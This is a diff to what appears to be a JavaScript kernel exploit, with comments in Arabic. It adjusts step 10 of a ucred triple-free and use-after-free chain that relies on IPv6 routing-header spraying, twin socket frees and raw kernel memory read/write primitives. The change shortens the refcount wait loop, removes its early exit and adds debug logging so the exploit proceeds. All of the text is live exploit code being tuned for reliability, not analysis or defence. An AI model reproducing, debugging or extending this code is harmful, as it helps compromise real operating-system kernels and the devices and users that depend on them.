@@ -1296,7 +1296,7 @@ function remove_uaf_file() {
 }
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 500;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 10;
 
 function trigger_ucred_triplefree() {
 
@@ -1373,10 +1373,12 @@ function trigger_ucred_triplefree() {
     send_notification("[STEP 9] Freeing twin index=" + twins[1]);
     free_rthdr(ipv6_socks[twins[1]]);
 
-    // STEP 10
+    // STEP 10 — مراقبة refcount بدون كسر للفلو
     send_notification("[STEP 10] Monitoring refcount on twin=" + twins[0]);
 
     var count = 0;
+    var first_ref = -1;
+    var ref_changed = false;
 
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
 
@@ -1385,23 +1387,35 @@ function trigger_ucred_triplefree() {
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
 
+      // قراءة ref (حتى لو مش واثقين فيه، هنستخدمه للمراقبة بس)
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
       var ref = read32(leak_rthdr);
 
-      // DEBUG REF
-      send_notification("[DEBUG] REFCOUNT READ = " + ref + " | count=" + count);
-
-      if (ref <= 0) {
-        send_notification("[DEBUG] STEP 10 BREAK TRIGGERED — ref <= 0");
-        return true;
+      // أول قراءة
+      if (first_ref === -1) {
+        first_ref = ref;
+      } else if (ref !== first_ref) {
+        ref_changed = true;
       }
 
+      send_notification(
+        "[DEBUG] REF=" + ref +
+        " | first_ref=" + first_ref +
+        " | changed=" + ref_changed +
+        " | count=" + count
+      );
+
+      // 👈 مفيش return هنا نهائيًا
       count++;
     }
 
-    send_notification("[STEP 10] Max wait reached → continue flow");
+    send_notification(
+      "[STEP 10] Done monitoring — ref_changed=" + ref_changed +
+      " | last_ref=" + ref
+    );
+
 
     // STEP 11
     close(dup(new BigInt(uaf_socket)));
